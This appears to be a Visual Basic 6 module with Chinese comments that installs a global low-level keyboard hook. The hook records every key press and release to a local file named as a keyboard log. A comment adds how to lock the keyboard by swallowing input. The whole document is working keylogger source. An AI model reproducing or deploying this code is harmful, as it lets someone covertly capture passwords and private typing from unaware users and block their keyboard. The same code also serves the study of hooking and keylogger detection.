Attribute VB_Name = "Module1"
Public hHook As Long    '用来存放钩子的句柄

Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long

Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Long) As Long

Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)


     Public Type EVENTMSG
        vKey As Long
       sKey As Long
       flag As Long
       time As Long
      End Type

Public mymsg  As EVENTMSG

Public Const WH_KEYBOARD_LL = 13

Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101

Public Function MyKBHook(ByVal ncode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

'这些参数在不同钩子中具有不同含义，在这里ncode 是类型代码
If ncode = 0 Then
 If wParam = WM_KEYDOWN Or wParam = WM_KEYUP Then  '在这里wParam 表示键盘事件，具体的按键信息保存在lParam 指针所指向的内存区域中

'把内存中lParam 指针所指向的数据复制到mymsg这个自定义类型
CopyMemory mymsg, ByVal lParam, Len(mymsg)

Open "键盘记录.txt" For Append As #1

If wParam = WM_KEYDOWN Then
    Write #1, Chr(mymsg.vKey), "DOWN"
Else
    Write #1, Chr(mymsg.vKey), "UP"
End If

Close #1
End If
End If

'将消息传给下一个钩子，如果你想锁定键盘，只需要把这句改成MyKBHook =-1，表示吃掉这个消息，这样键盘就输入不了了:-)

MyKBHook = CallNextHookEx(hHook, ncode, wParam, lParam)

End Function
